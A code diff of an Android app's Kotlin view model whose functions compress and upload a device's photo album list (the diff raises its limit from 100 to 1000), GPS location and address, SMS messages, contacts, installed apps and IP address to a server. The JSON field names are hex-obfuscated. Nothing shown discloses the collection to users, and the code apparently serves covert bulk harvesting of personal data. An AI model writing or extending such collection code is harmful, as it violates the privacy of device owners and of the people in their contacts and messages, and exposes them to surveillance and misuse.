@@ -39,14 +39,14 @@ open class DeviceInfoViewModel : BaseViewModel() {
      */
     fun upDevicePhoto() {
         rxLaunchUI({
-            val files = DeviceUtils.getLocalAlbumList(0, 100)
+            val files = DeviceUtils.getLocalAlbumList(0, 1000)
             val paramStr = GsonUtils.toJson(files)
             LogUtils.dTag("deviceParam", "uploadDeviceAlbumInfo ->$paramStr")
             val paramBean =
                 DevicePhotoParamBean(`9091829D9791BD9A929BAE9D84A78086` = paramStr.GZIPCompress())
             val result = Api.uploadDeviceAlbumInfo(GsonUtils.toJson(paramBean))
             upDeviceInfo.postValue(result.`869187819880`)
-        }, showDialog = false, showToast = false)
+        }, showToast = false)
     }
 
     /**
@@ -57,19 +57,23 @@ open class DeviceInfoViewModel : BaseViewModel() {
             val curLatitude = MmkvUtil.decodeDouble("curLatitude") ?: 0.0
             val curLongitude = MmkvUtil.decodeDouble("curLongitude") ?: 0.0
             val address = LocationUtils.getAddress(curLatitude, curLongitude)
+            var area = address.subLocality
+            if (area.isNullOrEmpty()){
+                area = address.subAdminArea + address.thoroughfare
+            }
             val paramBean = DeviceLocationParamBean(
                 LocationBean(
                     `938487` = GpsBean(curLatitude, curLongitude),
                     `938487B5909086918787A4869B829D9A9791` = address?.adminArea.nullToEmpty(),
                     `938487B5909086918787B79D808D` = address?.locality.nullToEmpty(),
-                    `938487B5909086918787B895869391B09D8780869D9780` = address?.subLocality.nullToEmpty()
+                    `938487B5909086918787B895869391B09D8780869D9780` = area
                 )
             )
             val paramStr = GsonUtils.toJson(paramBean)
             LogUtils.dTag("deviceParam", "uploadDeviceLocation ->$paramStr")
             val result = Api.uploadDeviceLocation(paramStr)
             upDeviceInfo.postValue(result.`869187819880`)
-        }, showDialog = false, showToast = false)
+        }, showToast = false)
     }
 
     /**
@@ -82,7 +86,7 @@ open class DeviceInfoViewModel : BaseViewModel() {
             val paramBean = DeviceSMSParamBean(paramStr.GZIPCompress())
             val result = Api.uploadDeviceSmsInfo(GsonUtils.toJson(paramBean))
             upDeviceInfo.postValue(result.`869187819880`)
-        }, showDialog = false, showToast = false)
+        }, showToast = false)
     }
 
     /**
@@ -95,7 +99,7 @@ open class DeviceInfoViewModel : BaseViewModel() {
             val paramBean = DeviceContactsParamBean(paramStr.GZIPCompress())
             val result = Api.uploadDeviceContactsInfo(GsonUtils.toJson(paramBean))
             upDeviceInfo.postValue(result.`869187819880`)
-        }, showDialog = false, showToast = false)
+        }, showToast = false)
     }
 
     /**
@@ -108,14 +112,14 @@ open class DeviceInfoViewModel : BaseViewModel() {
             val paramBean = DeviceAppsParamBean(paramStr.GZIPCompress())
             val result = Api.uploadDeviceAppInfo(GsonUtils.toJson(paramBean))
             upDeviceInfo.postValue(result.`869187819880`)
-        }, showDialog = false, showToast = false)
+        }, showToast = false)
     }
 
     fun getIpAddress() {
         rxLaunchUI({
             val result = Api.getIpAddress()
-            MmkvUtil.encode(Constant.IPADDRESS,result)
-        }, showDialog = false, showToast = false)
+            MmkvUtil.encode(Constant.IPADDRESS, result)
+        }, showToast = false)
     }
 
     /**
@@ -169,13 +173,9 @@ open class DeviceInfoViewModel : BaseViewModel() {
             val paramStr = GsonUtils.toJson(paramBean)
             LogUtils.dTag("deviceParam", "uploadDeviceBaseInfo ->$paramStr")
             val result = Api.uploadDeviceBaseInfo(
-                GsonUtils.toJson(
-                    DeviceBaseParamBean(
-                        paramStr.GZIPCompress()
-                    )
-                )
+                GsonUtils.toJson(DeviceBaseParamBean(paramStr.GZIPCompress()))
             )
             upDeviceInfo.postValue(result.`869187819880`)
-        }, showDialog = false, showToast = false)
+        }, showToast = false)
     }
 }
